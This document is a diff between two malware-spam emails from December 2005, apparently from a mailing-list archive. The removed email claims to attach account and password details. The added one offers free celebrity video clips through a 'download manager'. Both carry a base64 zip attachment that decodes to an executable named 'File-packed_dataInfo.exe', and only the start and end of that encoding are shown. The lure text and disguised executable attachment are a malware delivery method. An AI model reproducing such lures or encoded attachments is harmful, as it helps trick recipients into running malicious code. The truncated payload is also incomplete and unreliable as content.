@@ -1,29 +1,30 @@
-From: postman@decadance-music.de
-Subject: Registration Confirmation
-Date: Fri, 23 Dec 2005 20:47:38 GMT
-Message-ID: <8783ce5.5f2a41c602e@obpfeupau.com>
+From: info@netsonic.fi
+Subject: Paris Hilton & Nicole Richie
+Date: Fri, 23 Dec 2005 22:13:39 UTC
+Message-ID: <e0ce2.cbe2d80effcc@netsonic.fi>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="====6d3ddefbc6b6117d2b"
+Content-Type: multipart/mixed; boundary="=cd436f9f75be"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: xfs-masters@oss.sgi.com
+To: mailserver@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---====6d3ddefbc6b6117d2b
+--=cd436f9f75be
 
-Account and Password Information are attached!
+The Simple Life:
 
+View Paris Hilton & Nicole Richie video clips , pictures & more ;)
+Download is free until Jan, 2006!
 
-***** Go to: http://www.decadance-music.de
-***** Email: postman@decadance-music.de
---====6d3ddefbc6b6117d2b
-Content-Type: application/octet-stream; name=reg_pass.zip
+Please use our Download manager.
+--=cd436f9f75be
+Content-Type: application/octet-stream; name=downloadm.zip
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="reg_pass.zip"
+Content-Disposition: attachment; filename="downloadm.zip"
 
 UEsDBAoAAAAAAACQdjPMyus3XtgAAF7YAAAYAAAARmlsZS1wYWNrZWRfZGF0YUluZm8uZXhlTVqQ
 AAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -1000,4 +1001,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---====6d3ddefbc6b6117d2b--
+--=cd436f9f75be--
